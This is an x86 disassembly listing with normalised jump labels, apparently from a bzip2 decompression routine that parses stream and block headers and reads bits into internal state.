mov [ ebx + 0xfa54 ] eax
mov [ ebx + 0xfa58 ] eax
mov [ ebx + 0xfa5c ] eax
mov [ ebx + 0xfa60 ] eax
mov [ ebx + 0xfa64 ] eax
mov [ ebx + 0xfa68 ] eax
mov [ ebx + 0xfa6c ] eax
mov [ ebx + 0xfa70 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebx + 0xfa14 ] ecx
mov ecx [ ebp - 0x1c ]
mov [ ebx + 0xfa18 ] ecx
mov ecx [ ebp - 0x40 ]
mov [ ebx + 0xfa1c ] ecx
mov ecx [ ebp - 0x60 ]
mov [ ebx + 0xfa20 ] ecx
mov ecx [ ebp - 0x3c ]
mov [ ebx + 0xfa24 ] ecx
mov ecx [ ebp - 0x54 ]
mov [ ebx + 0xfa28 ] ecx
mov ecx [ ebp - 0x64 ]
mov [ ebx + 0xfa2c ] ecx
mov ecx [ ebp - 0x24 ]
mov [ ebx + 0xfa30 ] ecx
mov ecx [ ebp - 0x28 ]
mov [ ebx + 0xfa34 ] ecx
mov ecx [ ebp - 0x48 ]
mov [ ebx + 0xfa38 ] ecx
mov ecx [ ebp - 0x30 ]
mov [ ebx + 0xfa3c ] ecx
mov ecx [ ebp - 0x18 ]
mov [ ebx + 0xfa40 ] ecx
mov ecx [ ebp - 0x20 ]
mov [ ebx + 0xfa44 ] ecx
mov ecx [ ebp - 0x70 ]
mov [ ebx + 0xfa48 ] ecx
mov ecx [ ebp - 0x34 ]
mov [ ebx + 0xfa4c ] ecx
mov ecx [ ebp - 0x80 ]
mov [ ebx + 0xfa50 ] ecx
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0xfa54 ] ecx
mov ecx [ ebp - 0x2c ]
mov [ ebx + 0xfa58 ] ecx
mov ecx [ ebp - 0x74 ]
mov [ ebx + 0xfa5c ] ecx
mov ecx [ ebp - 0x6c ]
mov [ ebx + 0xfa60 ] ecx
mov ecx [ ebp - 0x5c ]
mov [ ebx + 0xfa64 ] ecx
mov ecx [ ebp - 0x58 ]
mov [ ebx + 0xfa68 ] ecx
mov ecx [ ebp - 0x44 ]
mov [ ebx + 0xfa6c ] ecx
mov ecx [ ebp - 0x50 ]
mov [ ebx + 0xfa70 ] ecx
mov edi 0xff
jmp [ ecx * 4 + jump_table_1000b457 ]
mov [ ebx + 0x4 ] 0xa
jmp r-xdata
mov [ ebx + 0x4 ] 0xb
jmp r-xdata
mov [ ebx + 0x4 ] 0xc
jmp r-xdata
mov [ ebx + 0x4 ] 0xd
jmp r-xdata
mov [ ebx + 0x4 ] 0xe
jmp r-xdata
mov [ ebx + 0x4 ] 0xf
jmp r-xdata
mov [ ebx + 0x4 ] 0x10
jmp r-xdata
mov [ ebx + 0x4 ] 0x11
jmp r-xdata
mov [ ebx + 0x4 ] 0x12
jmp r-xdata
mov [ ebx + 0x4 ] 0x13
jmp r-xdata
mov [ ebx + 0x4 ] 0x14
jmp r-xdata
mov [ ebx + 0x4 ] 0x15
jmp r-xdata
mov [ ebx + 0x4 ] 0x16
jmp r-xdata
mov [ ebx + 0x4 ] 0x17
jmp r-xdata
mov [ ebx + 0x4 ] 0x18
jmp r-xdata
mov [ ebx + 0x4 ] 0x19
jmp r-xdata
mov [ ebx + 0x4 ] 0x1a
jmp r-xdata
mov [ ebx + 0x4 ] 0x1b
jmp r-xdata
mov [ ebx + 0x4 ] 0x1c
jmp r-xdata
mov [ ebx + 0x4 ] 0x1d
jmp r-xdata
mov [ ebx + 0x4 ] 0x1e
jmp r-xdata
mov [ ebx + 0x4 ] 0x1f
jmp r-xdata
mov [ ebx + 0x4 ] 0x20
jmp r-xdata
mov [ ebx + 0x4 ] 0x23
jmp r-xdata
mov [ ebx + 0x4 ] 0x22
jmp r-xdata
mov [ ebx + 0x4 ] 0x21
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0x4 ] 0x24
jmp r-xdata
mov [ ebx + 0x4 ] 0x25
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0x4 ] 0x26
jmp r-xdata
mov [ ebx + 0x4 ] 0x27
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0x4 ] 0x28
jmp r-xdata
mov [ ebx + 0x4 ] 0x29
jmp r-xdata
mov [ ebx + 0x4 ] 0x2a
jmp r-xdata
mov [ ebx + 0x4 ] 0x2b
jmp r-xdata
mov [ ebx + 0x4 ] 0x2c
jmp r-xdata
mov [ ebx + 0x4 ] 0x2d
jmp r-xdata
mov [ ebx + 0x4 ] 0x2e
jmp r-xdata
mov [ ebx + 0x4 ] 0x2f
jmp r-xdata
mov [ ebx + 0x4 ] 0x30
jmp r-xdata
mov [ ebx + 0x4 ] 0x31
jmp r-xdata
mov [ ebx + 0x4 ] 0x32
jmp r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x3
jl r-xdata
cmp [ ebx + 0x20 ] 0xf
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x5
jl r-xdata
cmp [ ebx + 0x20 ] ecx
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] ecx
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] ecx
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x42
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x5a
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x68
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp eax 0x31
mov [ ebx + 0x24 ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x17
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x41
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x59
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x26
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x53
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x59
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
and [ ebx + 0x34 ] 0x0
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x10 ] al
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
mov ecx [ ebx + 0x34 ]
add edx 0xfffffff8
shl ecx 0x8
and eax edi
movzx eax al
or ecx eax
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x34 ] ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
mov ecx [ ebx + 0x34 ]
add edx 0xfffffff8
shl ecx 0x8
and eax edi
movzx eax al
or ecx eax
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x34 ] ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ ebx + 0x1c ]
lea ecx [ eax - 0x8 ]
shr edx cl
add eax 0xfffffff8
mov [ ebx + 0x20 ] eax
mov eax [ ebx + 0x34 ]
and edx edi
movzx ecx dl
shl eax 0x8
or eax ecx
mov [ ebx + 0x34 ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x10 ]
and eax 0x1
dec edx
cmp al 0x1
sete al
inc [ ebp - 0x10 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + ecx + 0xd6c ] al
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
cmp al 0x1
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x3 ]
shr eax cl
add edx 0xfffffffd
mov [ ebx + 0x20 ] edx
and eax 0x7
cmp eax 0x2
mov [ ebp - 0x3c ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0xf ]
shr eax cl
add edx 0xfffffff1
mov [ ebx + 0x20 ] edx
and eax 0x7fff
cmp eax 0x1
mov [ ebp - 0x54 ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
test al al
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
test al al
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
test al al
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x5 ]
shr eax cl
add edx 0xfffffffb
mov [ ebx + 0x20 ] edx
and eax 0x1f
and [ ebp - 0x10 ] 0x0
mov [ ebp - 0x34 ] eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esi [ ebp - 0x14 ]
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
sub edx esi
xor edi edi
mov ecx edx
shr eax cl
inc edi
mov ecx esi
shl edi cl
dec edi
and eax edi
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
mov esi [ ebp - 0x14 ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x2c ]
add ecx ecx
and eax 0x1
dec edx
or ecx eax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x2c ] ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esi [ ebp - 0x14 ]
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
sub edx esi
xor edi edi
mov ecx edx
shr eax cl
inc edi
mov ecx esi
shl edi cl
dec edi
and eax edi
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
mov esi [ ebp - 0x14 ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x2c ]
add ecx ecx
and eax 0x1
dec edx
mov [ ebp - 0x74 ] eax
or eax ecx
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x14 ]
mov eax [ ebx + 0x1c ]
xor esi esi
mov ecx edx
shr eax cl
mov ecx [ ebp - 0x14 ]
inc esi
shl esi cl
dec esi
and eax esi
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x2c ]
add ecx ecx
and eax 0x1
dec edx
mov [ ebp - 0x74 ] eax
or eax ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x72
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x45
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x38
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x50
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x90
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov [ ebx + 0x4 ] 0x1
push 0x4
jmp r-xdata
xor eax eax
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push 0xfffffffb
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp eax 0x39
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp al 0x31
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push 0xfffffffc
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x2c ]
and [ ebx + 0xc58 ] 0x0
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebx + 0x24 ]
imul ecx ecx 0x186a0
add ecx 0xa
cmp eax ecx
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push 0x100
lea eax [ ebx + 0xc6c ]
push 0x0
push eax
call sub_10010a00
add esp 0xc
and [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
inc [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
